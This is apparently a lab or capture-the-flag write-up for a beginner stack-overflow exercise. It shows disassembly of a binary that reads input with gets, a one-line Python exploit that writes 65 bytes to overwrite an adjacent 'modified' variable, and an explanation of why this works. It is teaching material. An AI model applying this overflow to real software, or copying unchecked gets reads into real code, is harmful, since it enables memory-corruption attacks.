# ex00 - Stack overflow into a variable

## Goal
Print `you have changed the 'modified' variable`.

## Relevant assembly (`main`)
```asm
080483f4: push ebp
080483f5: mov  ebp,esp
080483f7: and  esp,0xfffffff0
080483fa: sub  esp,0x60
080483fd: mov  DWORD PTR [esp+0x5c],0x0      ; modified = 0
08048405: lea  eax,[esp+0x1c]                ; 64-byte buffer
08048409: mov  DWORD PTR [esp],eax
0804840c: call gets                            ; unsafe read
08048411: mov  eax,DWORD PTR [esp+0x5c]       ; modified
08048415: test eax,eax
08048417: je   0x08048427
08048419: mov  DWORD PTR [esp],0x8048500
08048420: call puts                            ; success message
```

The buffer is at `[esp+0x1c]`; `modified` is at `[esp+0x5c]`, exactly 64 bytes later.

## Exploit
```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"B" + b"\n")' | ./bin
```

## Why it works
`gets` does not check input length. The first 64 bytes fill the buffer, and the 65th byte (or later) overwrites `modified` with a nonzero value.
